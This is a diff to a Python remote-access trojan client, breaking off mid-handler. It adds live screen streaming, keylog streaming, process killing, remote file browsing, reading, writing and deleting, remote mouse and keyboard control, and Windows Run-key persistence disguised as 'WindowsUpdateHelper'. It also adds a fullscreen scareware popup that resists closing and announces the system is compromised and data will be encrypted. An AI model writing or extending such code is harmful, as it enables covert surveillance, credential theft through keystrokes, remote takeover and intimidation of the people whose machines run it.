@@ -7,6 +7,8 @@ import base64
 import platform
 import sys
 import threading
+import tkinter as tk
+from tkinter import messagebox
 
 # Auto-install required libraries
 def install_package(package, import_name=None):
@@ -31,12 +33,15 @@ install_package("mss")
 install_package("sounddevice")
 install_package("numpy")
 install_package("pynput")
+install_package("psutil")
 
 SERVER_IP = "127.0.0.1"
 PORT = 5000
 
 current_dir = os.getcwd()
 os_name = platform.system()
+
+client_lock = threading.Lock()
 
 # OS-specific command mappings
 COMMANDS = {
@@ -87,7 +92,8 @@ def connect_server():
                 "ip": socket.gethostbyname(socket.gethostname()),
                 "user": os.getlogin()
             }
-            client.send(json.dumps(info).encode())
+            with client_lock:
+                client.send(json.dumps(info).encode())
             
             return client
         except:
@@ -347,6 +353,96 @@ def capture_audio(duration=10):
             "message": f"Audio capture failed: {str(e)}"
         })
 
+# ── Live Screen Stream ─────────────────────────────────────────────────────────
+_screen_stream_active = False
+_screen_stream_thread = None
+
+def capture_live_frame():
+    try:
+        from PIL import Image
+        import io
+        import mss
+        
+        # Try mss first as it is extremely fast (uses direct OS APIs)
+        with mss.mss() as sct:
+            monitor = sct.monitors[1]
+            screenshot = sct.grab(monitor)
+            pil_img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
+            
+        orig_w, orig_h = pil_img.size
+        max_w = 1024
+        if orig_w > max_w:
+            ratio = max_w / orig_w
+            new_size = (max_w, int(orig_h * ratio))
+            pil_img = pil_img.resize(new_size, Image.Resampling.BILINEAR)
+        
+        buffer = io.BytesIO()
+        # Quality 50 is the sweet spot: small size (~25-35KB), fast compression, good legibility
+        pil_img.save(buffer, format='JPEG', quality=50, optimize=True)
+        img_data = base64.b64encode(buffer.getvalue()).decode()
+        
+        return json.dumps({
+            "type": "LIVE_SCREEN",
+            "status": "success",
+            "data": img_data,
+            "resolution": f"{orig_w}x{orig_h}"
+        })
+    except Exception as e:
+        # Fallback to ImageGrab if mss fails
+        try:
+            from PIL import ImageGrab
+            screenshot = ImageGrab.grab()
+            orig_w, orig_h = screenshot.size
+            max_w = 1024
+            if orig_w > max_w:
+                ratio = max_w / orig_w
+                new_size = (max_w, int(orig_h * ratio))
+                screenshot = screenshot.resize(new_size, Image.Resampling.BILINEAR)
+            buffer = io.BytesIO()
+            screenshot.save(buffer, format='JPEG', quality=50, optimize=True)
+            img_data = base64.b64encode(buffer.getvalue()).decode()
+            return json.dumps({
+                "type": "LIVE_SCREEN",
+                "status": "success",
+                "data": img_data,
+                "resolution": f"{orig_w}x{orig_h}"
+            })
+        except Exception as ex:
+            return json.dumps({
+                "type": "LIVE_SCREEN",
+                "status": "error",
+                "message": f"Capture error: {ex}"
+            })
+
+def start_screen_stream():
+    global _screen_stream_active, _screen_stream_thread
+    if _screen_stream_active:
+        return
+    _screen_stream_active = True
+    def stream():
+        global client, _screen_stream_active
+        while _screen_stream_active:
+            try:
+                frame_data = capture_live_frame()
+                if frame_data:
+                    payload = frame_data.encode()
+                    with client_lock:
+                        client.send(payload)
+                        client.send(b"\n[FRAME_END]\n")
+                # Wait 40ms (corresponds to ~25 FPS max)
+                time.sleep(0.04)
+            except Exception:
+                break
+        _screen_stream_active = False
+
+    _screen_stream_thread = threading.Thread(target=stream, daemon=True)
+    _screen_stream_thread.start()
+
+def stop_screen_stream():
+    global _screen_stream_active
+    _screen_stream_active = False
+
+
 # ── Keylog Live-Stream State ────────────────────────────────────────────────────
 _keylog_listener = None
 _keylog_active = False
@@ -379,8 +475,9 @@ def start_keylog_stream():
                 else:
                     line = f"[KEYSTROKE] {ts} <{s.upper()}>"
             global client
-            client.send(line.encode())
-            client.send(b"\n")
+            with client_lock:
+                client.send(line.encode())
+                client.send(b"\n")
         except Exception:
             pass
 
@@ -400,7 +497,8 @@ def stop_keylog_stream():
         _keylog_listener = None
     global client
     try:
-        client.send(b"[KEYLOG_END]\n")
+        with client_lock:
+            client.send(b"[KEYLOG_END]\n")
     except Exception:
         pass
 
@@ -525,7 +623,15 @@ def upload_file(filename, data_b64):
         
         file_data = base64.b64decode(data_b64)
         
-        filepath = os.path.join(current_dir, filename)
+        if os.path.isabs(filename):
+            filepath = filename
+        else:
+            filepath = os.path.join(current_dir, filename)
+            
+        parent_dir = os.path.dirname(filepath)
+        if parent_dir and not os.path.exists(parent_dir):
+            os.makedirs(parent_dir, exist_ok=True)
+            
         with open(filepath, 'wb') as f:
             f.write(file_data)
         
@@ -538,21 +644,590 @@ def upload_file(filename, data_b64):
     except Exception as e:
         return json.dumps({"type": "UPLOAD", "status": "error", "message": str(e)})
 
+def get_process_list():
+    """Get clean list of running processes using psutil"""
+    try:
+        import psutil
+        processes = []
+        for proc in psutil.process_iter(['pid', 'name', 'status', 'memory_info']):
+            try:
+                info = proc.info
+                mem_bytes = info['memory_info'].rss if info['memory_info'] else 0
+                mem_mb = round(mem_bytes / (1024 * 1024), 1)
+                processes.append({
+                    "pid": info['pid'],
+                    "name": info['name'] or "Unknown",
+                    "status": info['status'] or "unknown",
+                    "memory": mem_mb
+                })
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                continue
+        return json.dumps({
+            "type": "PROCESS_LIST",
+            "status": "success",
+            "data": processes
+        })
+    except Exception as e:
+        return json.dumps({
+            "type": "PROCESS_LIST",
+            "status": "error",
+            "message": str(e)
+        })
+
+def kill_process_by_pid(pid_str):
+    """Kill process by PID and handle errors"""
+    try:
+        import psutil
+        pid = int(pid_str)
+        proc = psutil.Process(pid)
+        proc.kill()
+        return json.dumps({
+            "type": "KILL_PROCESS",
+            "status": "success",
+            "pid": pid
+        })
+    except Exception as e:
+        return json.dumps({
+            "type": "KILL_PROCESS",
+            "status": "error",
+            "message": str(e),
+            "pid": pid_str
+        })
+
+def get_system_metrics():
+    """Get CPU, RAM, and Disk metrics"""
+    try:
+        import psutil
+        cpu = psutil.cpu_percent(interval=None)
+        ram = psutil.virtual_memory().percent
+        try:
+            disk = psutil.disk_usage('/').percent
+        except Exception:
+            try:
+                disk = psutil.disk_usage('C:\\').percent
+            except Exception:
+                disk = 0.0
+        return json.dumps({
+            "type": "SYSTEM_METRICS",
+            "status": "success",
+            "data": {
+                "cpu": cpu,
+                "ram": ram,
+                "disk": disk
+            }
+        })
+    except Exception as e:
+        return json.dumps({
+            "type": "SYSTEM_METRICS",
+            "status": "error",
+            "message": str(e)
+        })
+
+def list_directory_contents(path):
+    """List contents of specified path for the visual file manager"""
+    try:
+        if not path or path == "":
+            path = os.getcwd()
+        elif path.upper() == "DRIVES":
+            import psutil
+            items = []
+            for part in psutil.disk_partitions(all=True):
+                if part.mountpoint:
+                    items.append({
+                        "name": part.mountpoint,
+                        "is_dir": True,
+                        "size": 0.0
+                    })
+            seen = set()
+            unique_items = []
+            for item in items:
+                if item["name"] not in seen:
+                    seen.add(item["name"])
+                    unique_items.append(item)
+            return json.dumps({
+                "type": "FILE_BROWSER",
+                "status": "success",
+                "path": "System Drives",
+                "data": unique_items
+            })
+        else:
+            path = os.path.abspath(path)
+
+        items = []
+        for entry in os.scandir(path):
+            try:
+                is_dir = entry.is_dir()
+                size = entry.stat().st_size if not is_dir else 0
+                items.append({
+                    "name": entry.name,
+                    "is_dir": is_dir,
+                    "size": round(size / 1024, 1)
+                })
+            except Exception:
+                continue
+
+        items.sort(key=lambda x: (not x["is_dir"], x["name"].lower()))
+
+        return json.dumps({
+            "type": "FILE_BROWSER",
+            "status": "success",
+            "path": path,
+            "data": items
+        })
+    except Exception as e:
+        return json.dumps({
+            "type": "FILE_BROWSER",
+            "status": "error",
+            "message": str(e),
+            "path": path
+        })
+
+def delete_remote_file(path):
+    """Delete remote file or folder recursively"""
+    try:
+        path = os.path.abspath(path)
+        if not os.path.exists(path):
+            raise FileNotFoundError(f"Path not found: {path}")
+
+        if os.path.isdir(path):
+            import shutil
+            shutil.rmtree(path)
+        else:
+            os.remove(path)
+
+        return json.dumps({
+            "type": "DELETE_FILE",
+            "status": "success",
+            "path": path
+        })
+    except Exception as e:
+        return json.dumps({
+            "type": "DELETE_FILE",
+            "status": "error",
+            "message": str(e),
+            "path": path
+        })
+
+def read_text_file(path):
+    """Read remote text file safely with size checks, binary detection, and encoding preservation"""
+    try:
+        path = os.path.abspath(path)
+        if not os.path.exists(path):
+            raise FileNotFoundError(f"File not found: {path}")
+            
+        # 1. Size Check (Cap at 2 MB)
+        size = os.path.getsize(path)
+        if size > 2 * 1024 * 1024:
+            return json.dumps({
+                "type": "READ_TEXT_FILE",
+                "status": "error",
+                "message": "File is too large (limit is 2 MB).",
+                "path": path
+            })
+            
+        # 2. Binary File Detection
+        with open(path, "rb") as f:
+            chunk = f.read(1024)
+            if b"\x00" in chunk:
+                return json.dumps({
+                    "type": "READ_TEXT_FILE",
+                    "status": "error",
+                    "message": "Cannot open binary files in the text editor.",
+                    "path": path
+                })
+
+        # 3. Read & Detect Encoding
+        encodings = ["utf-8", "cp1252"]
+        raw_data = None
+        detected_encoding = None
+        
+        with open(path, "rb") as f:
+            raw_data = f.read()
+
+        for enc in encodings:
+            try:
+                decoded = raw_data.decode(enc)
+                detected_encoding = enc
+                break
+            except UnicodeDecodeError:
+                continue
+                
+        if detected_encoding is None:
+            # Fallback
+            decoded = raw_data.decode("utf-8", errors="replace")
+            detected_encoding = "utf-8"
+
+        # Base64 encode the decoded string safely to prevent carriage return/newline breakage in sockets
+        b64_content = base64.b64encode(decoded.encode("utf-8")).decode("utf-8")
+
+        return json.dumps({
+            "type": "READ_TEXT_FILE",
+            "status": "success",
+            "path": path,
+            "encoding": detected_encoding,
+            "content": b64_content
+        })
+    except Exception as e:
+        return json.dumps({
+            "type": "READ_TEXT_FILE",
+            "status": "error",
+            "message": str(e),
+            "path": path
+        })
+
+def write_text_file(path, encoding, content_b64):
+    """Write content back to file using original encoding"""
+    try:
+        path = os.path.abspath(path)
+        # Decode base64 bytes to raw bytes, then decode as utf-8 (which is how we encoded the string on read)
+        text_data = base64.b64decode(content_b64).decode("utf-8")
+        
+        # Write back using detected encoding
+        with open(path, "w", encoding=encoding, errors="replace") as f:
+            f.write(text_data)
+            
+        return json.dumps({
+            "type": "WRITE_TEXT_FILE",
+            "status": "success",
+            "path": path
+        })
+    except Exception as e:
+        return json.dumps({
+            "type": "WRITE_TEXT_FILE",
+            "status": "error",
+            "message": str(e),
+            "path": path
+        })
+
 def _add_persistence():
     """Add to Windows startup registry (HKCU Run) for persistence."""
     if platform.system() == "Windows":
         try:
             import winreg as _wr
-            exe = sys.executable if sys.executable.lower().endswith(".exe") else sys.argv[0]
-            if not exe.lower().endswith(".exe"):
-                return
+            if getattr(sys, 'frozen', False):
+                cmd_line = f'"{sys.executable}"'
+            else:
+                cmd_line = f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}"'
             key = _wr.OpenKey(_wr.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Run",
                               0, _wr.KEY_SET_VALUE)
-            _wr.SetValueEx(key, "WindowsUpdateHelper", 0, _wr.REG_SZ, f'"{exe}"')
+            _wr.SetValueEx(key, "WindowsUpdateHelper", 0, _wr.REG_SZ, cmd_line)
             _wr.CloseKey(key)
         except Exception:
             pass
+
+
+def show_cyber_popup(title, message):
+    """Show a premium floating borderless cyberpunk style popup with cycling neon borders."""
+    import tkinter as tk
+    import threading
+    import platform
+    import time
+
+    root = tk.Tk()
+    root.title(title)
+    root.configure(bg="#0B0B0F")
+    root.attributes('-topmost', True)
+    root.overrideredirect(True)  # Borderless for premium custom HUD style
+
+    w, h = 500, 300
+    sw = root.winfo_screenwidth()
+    sh = root.winfo_screenheight()
+    x = (sw - w) // 2
+    y = (sh - h) // 2
+    root.geometry(f"{w}x{h}+{x}+{y}")
+
+    # Neon Color Cycling Border
+    border_frame = tk.Frame(root, bg="#00E5FF")
+    border_frame.pack(fill="both", expand=True, padx=3, pady=3)
+    
+    inner_frame = tk.Frame(border_frame, bg="#09090D")
+    inner_frame.pack(fill="both", expand=True, padx=2, pady=2)
+
+    # Accent bar
+    accent_bar = tk.Frame(inner_frame, bg="#00E5FF", height=5)
+    accent_bar.pack(fill="x")
+
+    # Blinking status dot
+    dot_frame = tk.Frame(inner_frame, bg="#09090D")
+    dot_frame.pack(anchor="ne", padx=15, pady=(10, 0))
+    status_dot = tk.Label(dot_frame, text="● SYSTEM LINK ACTIVE", font=("Consolas", 8, "bold"), bg="#09090D", fg="#FF0055")
+    status_dot.pack()
+
+    def blink_dot():
+        try:
+            current_fg = status_dot.cget("fg")
+            next_fg = "#09090D" if current_fg == "#FF0055" else "#FF0055"
+            status_dot.config(fg=next_fg)
+            root.after(400, blink_dot)
+        except:
+            pass
+    blink_dot()
+
+    # Header title
+    header = tk.Label(inner_frame, text="", font=("Consolas", 13, "bold"), bg="#09090D", fg="#00E5FF")
+    header.pack(pady=(5, 5))
+
+    # Decorative line
+    dec_line = tk.Label(inner_frame, text="[ ======================================= ]", font=("Consolas", 9), bg="#09090D", fg="#454555")
+    dec_line.pack()
+
+    # Message text (will be typed out)
+    msg_label = tk.Label(
+        inner_frame, text="", font=("Segoe UI", 11, "bold"), bg="#09090D", fg="#ECEFF1",
+        wraplength=440, justify="center"
+    )
+    msg_label.pack(pady=15, expand=True)
+
+    # Window Shake Animation
+    def shake_window(step=0):
+        try:
+            if step < 12:
+                dx = 15 if step % 2 == 0 else -15
+                root.geometry(f"{w}x{h}+{x + dx}+{y}")
+                root.after(40, shake_window, step + 1)
+            else:
+                root.geometry(f"{w}x{h}+{x}+{y}")
+        except:
+            pass
+
+    # Typing text effect
+    def type_text(widget, full_text, current_text="", char_idx=0):
+        try:
+            if char_idx < len(full_text):
+                current_text += full_text[char_idx]
+                widget.config(text=current_text)
+                root.after(20, type_text, widget, full_text, current_text, char_idx + 1)
+        except:
+            pass
+
+    # Color cycling pulse animation
+    def pulse_border(color_idx=0):
+        try:
+            colors = ["#FF0055", "#00E5FF", "#00FF66", "#FFFF00"]
+            border_frame.config(bg=colors[color_idx])
+            header.config(fg=colors[color_idx])
+            accent_bar.config(bg=colors[color_idx])
+            root.after(800, pulse_border, (color_idx + 1) % len(colors))
+        except:
+            pass
+
+    # Acknowledge Button
+    btn = tk.Button(
+        inner_frame, text="[ ACKNOWLEDGE RECEIPT ]", command=root.destroy,
+        font=("Consolas", 11, "bold"), bg="#1A1A22", fg="#00E5FF",
+        relief="flat", activebackground="#00E5FF", activeforeground="#121214",
+        padx=30, pady=8, cursor="hand2"
+    )
+    btn.pack(pady=(5, 20))
+
+    def on_enter(e): btn.config(bg="#00E5FF", fg="#121214")
+    def on_leave(e): btn.config(bg="#1A1A22", fg="#00E5FF")
+    btn.bind("<Enter>", on_enter)
+    btn.bind("<Leave>", on_leave)
+
+    # Sound play thread
+    def play_warning_sound():
+        if platform.system() == "Windows":
+            try:
+                import winsound
+                # Sequence of high-tech alert chirps
+                for _ in range(2):
+                    winsound.Beep(1800, 100)
+                    winsound.Beep(1200, 100)
+            except:
+                pass
+
+    # Speech synthesis thread
+    def speak_message():
+        if platform.system() == "Windows":
+            try:
+                import subprocess
+                clean_msg = message.replace("'", "").replace('"', "")
+                ps_cmd = (
+                    'powershell -Command "Add-Type -AssemblyName System.Speech; '
+                    '$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; '
+                    '$synth.Rate = -1; '
+                    f'$synth.Speak(\'Incoming message. {clean_msg}\')"'
+                )
+                subprocess.run(ps_cmd, shell=True, creationflags=0x08000000)
+            except:
+                pass
+
+    # Run animations and effects
+    shake_window()
+    pulse_border()
+    
+    # Start typing effects after window finishes shaking
+    root.after(500, lambda: type_text(header, f"✉  {title.upper()}"))
+    root.after(800, lambda: type_text(msg_label, message))
+
+    # Play warning sounds and voice in background
+    threading.Thread(target=play_warning_sound, daemon=True).start()
+    root.after(1000, lambda: threading.Thread(target=speak_message, daemon=True).start())
+
+    root.mainloop()
+
+
+def show_override_popup(title, message):
+    """Show fullscreen blinking system override screen with sirens and voice synthesizer."""
+    import tkinter as tk
+    root = tk.Tk()
+    root.title(title)
+
+    # Borderless + topmost + start invisible (fade-in)
+    root.overrideredirect(True)
+    root.attributes('-topmost', True)
+    root.attributes('-alpha', 0.0)
+
+    sw = root.winfo_screenwidth()
+    sh = root.winfo_screenheight()
+    root.geometry(f"{sw}x{sh}+0+0")
+    root.configure(bg="#FF003C")
+
+    # Block close attempts
+    root.protocol("WM_DELETE_WINDOW", lambda: None)
+    root.bind("<Alt-F4>", lambda e: "break")
+    root.bind("<Escape>", lambda e: "break")
+
+    outer_glow = tk.Frame(root, bg="#FF003C")
+    outer_glow.pack(fill="both", expand=True, padx=6, pady=6)
+
+    inner = tk.Frame(outer_glow, bg="#0A0A0A")
+    inner.pack(fill="both", expand=True, padx=2, pady=2)
+
+    warn_bar = tk.Frame(inner, bg="#FF003C", height=8)
+    warn_bar.pack(fill="x")
+    warn_bar.pack_propagate(False)
+
+    alert_label = tk.Label(inner, text="⚠️ SYSTEM OVERRIDE ⚠️",
+                           font=("Consolas", 36, "bold"), bg="#0A0A0A", fg="#FF003C")
+    alert_label.pack(pady=(50, 10))
+
+    def blink_alert():
+        try:
+            current_fg = alert_label.cget("fg")
+            next_fg = "#0A0A0A" if current_fg == "#FF003C" else "#FF003C"
+            alert_label.config(fg=next_fg)
+            root.after(300, blink_alert)
+        except: pass
+    blink_alert()
+
+    tk.Label(inner, text=title, font=("Consolas", 42, "bold"),
+             bg="#0A0A0A", fg="white", wraplength=sw-100).pack(pady=(20, 15))
+
+    msg_label = tk.Label(inner, text=message, font=("Consolas", 24),
+                         bg="#0A0A0A", fg="#00FF41", wraplength=sw-100,
+                         justify="center")
+    msg_label.pack(pady=15, expand=True)
+
+    tk.Label(inner, text="DO NOT IGNORE — CRITICAL SYSTEM ALERT",
+             font=("Consolas", 14, "bold"), bg="#0A0A0A", fg="#FF003C").pack(pady=(10, 5))
+
+    is_open = [True]
+    click_count = [0]
+
+    def ambulance_siren_loop():
+        if platform.system() != "Windows": return
+        try:
+            import winsound
+            while is_open[0]:
+                if not is_open[0]: break
+                winsound.Beep(700, 400)
+                if not is_open[0]: break
+                winsound.Beep(900, 400)
+        except: pass
+
+    def scary_voice_loop():
+        if platform.system() != "Windows": return
+        try:
+            import subprocess
+            msg_text = "Warning. System compromised. Unauthorized access detected. All data will be encrypted."
+            ps_cmd = (
+                'powershell -Command "Add-Type -AssemblyName System.Speech; '
+                '$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; '
+                '$synth.Rate = -3; '
+                f'$synth.Speak(\'{msg_text}\')"'
+            )
+            while is_open[0]:
+                subprocess.run(ps_cmd, shell=True, creationflags=0x08000000)
+        except: pass
+
+    threading.Thread(target=ambulance_siren_loop, daemon=True).start()
+    threading.Thread(target=scary_voice_loop, daemon=True).start()
+
+    def on_enter(e): btn.config(bg="#FF003C", fg="white")
+    def on_leave(e): btn.config(bg="#1A1A2D", fg="#FF003C")
+
+    def close_popup():
+        click_count[0] += 1
+        if click_count[0] >= 3:
+            is_open[0] = False
+            root.destroy()
+        else:
+            btn.config(text=f"[ ACKNOWLEDGE ({3-click_count[0]}) ]")
+
+    btn = tk.Button(inner, text="[ ACKNOWLEDGE (3) ]", command=close_popup,
+                    font=("Consolas", 18, "bold"), bg="#1A1A2D", fg="#FF003C",
+                    relief="flat", activebackground="#FF003C", activeforeground="white",
+                    padx=40, pady=15)
+    btn.pack(pady=40)
+    btn.bind("<Enter>", on_enter)
+    btn.bind("<Leave>", on_leave)
+
+    def fade_in(alpha=0.0):
+        try:
+            alpha += 0.05
+            if alpha <= 1.0:
+                root.attributes('-alpha', alpha)
+                root.after(30, fade_in, alpha)
+        except: pass
+    root.after(100, fade_in)
+
+    def force_focus():
+        try:
+            root.lift()
+            root.attributes('-topmost', True)
+            root.focus_force()
+            root.after(500, force_focus)
+        except: pass
+    force_focus()
+
+    root.mainloop()
+
+
+def show_selected_popup(style, title, message):
+    """Show the selected popup style with a safe OS-level fallback if Tkinter fails."""
+    try:
+        if style in ("INFO", "WARNING", "ERROR"):
+            import tkinter as tk
+            from tkinter import messagebox
+            root = tk.Tk()
+            root.withdraw()
+            root.attributes("-topmost", True)
+            if style == "INFO":
+                messagebox.showinfo(title, message, parent=root)
+            elif style == "WARNING":
+                messagebox.showwarning(title, message, parent=root)
+            elif style == "ERROR":
+                messagebox.showerror(title, message, parent=root)
+            root.destroy()
+        elif style == "CYBER":
+            show_cyber_popup(title, message)
+        elif style == "OVERRIDE":
+            show_override_popup(title, message)
+        else:
+            show_cyber_popup(title, message)
+
+    except Exception:
+        # Fallback to OS Messagebox
+        try:
+            import ctypes
+            icon_map = {"INFO": 0x40, "WARNING": 0x30, "ERROR": 0x10, "CYBER": 0x40, "OVERRIDE": 0x10}
+            icon = icon_map.get(style, 0x40)
+            ctypes.windll.user32.MessageBoxW(0, message, title, icon | 0x40000 | 0x10000)
+        except Exception:
+            print(f"Fallback Print Alert [{style}] - {title}: {message}")
 
 
 def main_loop():
@@ -598,147 +1273,31 @@ def main_loop():
                     if cmd.startswith("POPUP:"):
                         # Show popup message on client screen
                         try:
-                            parts = cmd.split(":", 2)
-                            title = parts[1] if len(parts) > 1 else "Message"
-                            message = parts[2] if len(parts) > 2 else ""
+                            parts = cmd.split(":", 3)
                             
-                            def show_big_popup():
-                                try:
-                                    import tkinter as tk
-                                    root = tk.Tk()
-                                    root.title(title)
+                            # Parse format: POPUP:<style>:<title>:<message> or POPUP:<title>:<message>
+                            possible_style = parts[1].upper() if len(parts) > 1 else "CYBER"
+                            if possible_style in ("CYBER", "INFO", "WARNING", "ERROR", "OVERRIDE"):
+                                style = possible_style
+                                title = parts[2] if len(parts) > 2 else "Alert"
+                                message = parts[3] if len(parts) > 3 else ""
+                            else:
+                                # Backward compatibility: parse as POPUP:title:message
+                                style = "CYBER"  # Default style
+                                title = parts[1] if len(parts) > 1 else "Alert"
+                                message = parts[2] if len(parts) > 2 else ""
 
-                                    # Borderless + topmost + start invisible (fade-in)
-                                    root.overrideredirect(True)
-                                    root.attributes('-topmost', True)
-                                    root.attributes('-alpha', 0.0)
-
-                                    sw = root.winfo_screenwidth()
-                                    sh = root.winfo_screenheight()
-                                    root.geometry(f"{sw}x{sh}+0+0")
-
-                                    root.configure(bg="#FF003C")
-
-                                    # Block close attempts
-                                    root.protocol("WM_DELETE_WINDOW", lambda: None)
-                                    root.bind("<Alt-F4>", lambda e: "break")
-                                    root.bind("<Escape>", lambda e: "break")
-
-                                    outer_glow = tk.Frame(root, bg="#FF003C")
-                                    outer_glow.pack(fill="both", expand=True, padx=6, pady=6)
-
-                                    inner = tk.Frame(outer_glow, bg="#0A0A0A")
-                                    inner.pack(fill="both", expand=True, padx=2, pady=2)
-
-                                    warn_bar = tk.Frame(inner, bg="#FF003C", height=8)
-                                    warn_bar.pack(fill="x")
-                                    warn_bar.pack_propagate(False)
-
-                                    alert_label = tk.Label(inner, text="⚠️ SYSTEM OVERRIDE ⚠️",
-                                                           font=("Consolas", 36, "bold"), bg="#0A0A0A", fg="#FF003C")
-                                    alert_label.pack(pady=(50, 10))
-
-                                    def blink_alert():
-                                        try:
-                                            current_fg = alert_label.cget("fg")
-                                            next_fg = "#0A0A0A" if current_fg == "#FF003C" else "#FF003C"
-                                            alert_label.config(fg=next_fg)
-                                            root.after(300, blink_alert)
-                                        except: pass
-                                    blink_alert()
-
-                                    tk.Label(inner, text=title, font=("Consolas", 42, "bold"),
-                                             bg="#0A0A0A", fg="white", wraplength=sw-100).pack(pady=(20, 15))
-
-                                    msg_label = tk.Label(inner, text=message, font=("Consolas", 24),
-                                                         bg="#0A0A0A", fg="#00FF41", wraplength=sw-100,
-                                                         justify="center")
-                                    msg_label.pack(pady=15, expand=True)
-
-                                    tk.Label(inner, text="DO NOT IGNORE — CRITICAL SYSTEM ALERT",
-                                             font=("Consolas", 14, "bold"), bg="#0A0A0A", fg="#FF003C").pack(pady=(10, 5))
-
-                                    is_open = [True]
-                                    click_count = [0]
-
-                                    def ambulance_siren_loop():
-                                        if platform.system() != "Windows": return
-                                        try:
-                                            import winsound
-                                            while is_open[0]:
-                                                if not is_open[0]: break
-                                                winsound.Beep(700, 400)
-                                                if not is_open[0]: break
-                                                winsound.Beep(900, 400)
-                                        except: pass
-
-                                    def scary_voice_loop():
-                                        if platform.system() != "Windows": return
-                                        try:
-                                            import subprocess
-                                            msg_text = "Warning. System compromised. Unauthorized access detected. All data will be encrypted."
-                                            ps_cmd = (
-                                                'powershell -Command "Add-Type -AssemblyName System.Speech; '
-                                                '$synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; '
-                                                '$synth.Rate = -3; '
-                                                f'$synth.Speak(\'{msg_text}\')"'
-                                            )
-                                            while is_open[0]:
-                                                subprocess.run(ps_cmd, shell=True, creationflags=0x08000000)
-                                        except: pass
-
-                                    threading.Thread(target=ambulance_siren_loop, daemon=True).start()
-                                    threading.Thread(target=scary_voice_loop, daemon=True).start()
-
-                                    def on_enter(e): btn.config(bg="#FF003C", fg="white")
-                                    def on_leave(e): btn.config(bg="#1A1A1A", fg="#FF003C")
-
-                                    def close_popup():
-                                        click_count[0] += 1
-                                        if click_count[0] >= 3:
-                                            is_open[0] = False
-                                            root.destroy()
-                                        else:
-                                            btn.config(text=f"[ ACKNOWLEDGE ({3-click_count[0]}) ]")
-
-                                    btn = tk.Button(inner, text="[ ACKNOWLEDGE (3) ]", command=close_popup,
-                                                    font=("Consolas", 18, "bold"), bg="#1A1A1A", fg="#FF003C",
-                                                    relief="flat", activebackground="#FF003C", activeforeground="white",
-                                                    padx=40, pady=15)
-                                    btn.pack(pady=40)
-                                    btn.bind("<Enter>", on_enter)
-                                    btn.bind("<Leave>", on_leave)
-
-                                    # Fade-in (proven working approach)
-                                    def fade_in(alpha=0.0):
-                                        try:
-                                            alpha += 0.05
-                                            if alpha <= 1.0:
-                                                root.attributes('-alpha', alpha)
-                                                root.after(30, fade_in, alpha)
-                                        except: pass
-                                    root.after(100, fade_in)
-
-                                    # Keep window on top
-                                    def force_focus():
-                                        try:
-                                            root.lift()
-                                            root.attributes('-topmost', True)
-                                            root.focus_force()
-                                            root.after(500, force_focus)
-                                        except: pass
-                                    force_focus()
-
-                                    root.mainloop()
-                                except Exception as e:
-                                    # Fallback if tkinter fails
-                                    if platform.system() == "Windows":
-                                        import ctypes
-                                        ctypes.windll.user32.MessageBoxW(0, message, title, 0x40 | 0x40000 | 0x10000)
+                            # Spawn popup in a separate subprocess to prevent Tkinter thread-safety crashes (Tcl_AsyncDelete)
+                            if getattr(sys, 'frozen', False):
+                                cmd_args = [sys.executable, "--popup", style, title, message]
+                            else:
+                                cmd_args = [sys.executable, os.path.abspath(sys.argv[0]), "--popup", style, title, message]
                             
-                            threading.Thread(target=show_big_popup, daemon=True).start()
+                            # Hide console window of the spawned python subprocess on Windows
+                            creation_flags = 0x08000000 if platform.system() == "Windows" else 0
+                            subprocess.Popen(cmd_args, creationflags=creation_flags)
                             
-                            output = json.dumps({"type": "POPUP", "status": "success", "message": "Popup shown"}).encode()
+                            output = json.dumps({"type": "POPUP", "status": "success", "message": f"Popup alert ({style}) shown successfully"}).encode()
                         except Exception as e:
                             output = json.dumps({"type": "POPUP", "status": "error", "message": str(e)}).encode()
                     
@@ -760,7 +1319,12 @@ def main_loop():
                             output = json.dumps({"type": "MICROPHONE", "status": "error", "message": str(e)}).encode()
 
                     elif cmd == "MIC_START":
-                        start_mic_stream()
+                        try:
+                            start_mic_stream()
+                        except Exception as e:
+                            output = json.dumps({"type": "MICROPHONE", "status": "error", "message": f"Failed to start microphone stream: {str(e)}"}).encode()
+                            with client_lock:
+                                client.send(output)
                         continue
 
                     elif cmd == "MIC_STOP":
@@ -770,11 +1334,70 @@ def main_loop():
                             output = json.dumps({"type": "MICROPHONE", "status": "error", "message": str(e)}).encode()
                     
                     elif cmd == "KEYLOG_START":
-                        start_keylog_stream()
+                        try:
+                            start_keylog_stream()
+                        except Exception as e:
+                            output = json.dumps({"type": "KEYLOG", "status": "error", "message": f"Failed to start keylog stream: {str(e)}"}).encode()
+                            with client_lock:
+                                client.send(output)
                         continue
 
                     elif cmd == "KEYLOG_STOP":
                         stop_keylog_stream()
+                        continue
+
+                    elif cmd == "LIVE_SCREEN":
+                        try:
+                            start_screen_stream()
+                        except Exception as e:
+                            output = json.dumps({"type": "LIVE_SCREEN", "status": "error", "message": f"Failed to start screen stream: {str(e)}"}).encode()
+                            with client_lock:
+                                client.send(output)
+                        continue
+
+                    elif cmd == "LIVE_SCREEN_STOP":
+                        stop_screen_stream()
+                        continue
+
+                    elif cmd.startswith(("MOUSE_CLICK:", "MOUSE_MOVE:", "KEY_PRESS:")):
+                        try:
+                            if cmd.startswith("MOUSE_CLICK:"):
+                                parts = cmd.split(":")
+                                x = int(parts[1])
+                                y = int(parts[2])
+                                btn_type = parts[3]
+                                from pynput.mouse import Button, Controller as MouseController
+                                m = MouseController()
+                                m.position = (x, y)
+                                time.sleep(0.05)
+                                if btn_type == "right":
+                                    m.click(Button.right, 1)
+                                elif btn_type == "double":
+                                    m.click(Button.left, 2)
+                                else:
+                                    m.click(Button.left, 1)
+                            elif cmd.startswith("MOUSE_MOVE:"):
+                                parts = cmd.split(":")
+                                x = int(parts[1])
+                                y = int(parts[2])
+                                from pynput.mouse import Controller as MouseController
+                                m = MouseController()
+                                m.position = (x, y)
+                            elif cmd.startswith("KEY_PRESS:"):
+                                key_name = cmd.split(":", 1)[1]
+                                from pynput.keyboard import Key, Controller as KeyboardController
+                                k = KeyboardController()
+                                if key_name.startswith("Key."):
+                                    attr = key_name.split(".")[1]
+                                    key_obj = getattr(Key, attr, None)
+                                    if key_obj:
+                                        k.press(key_obj)
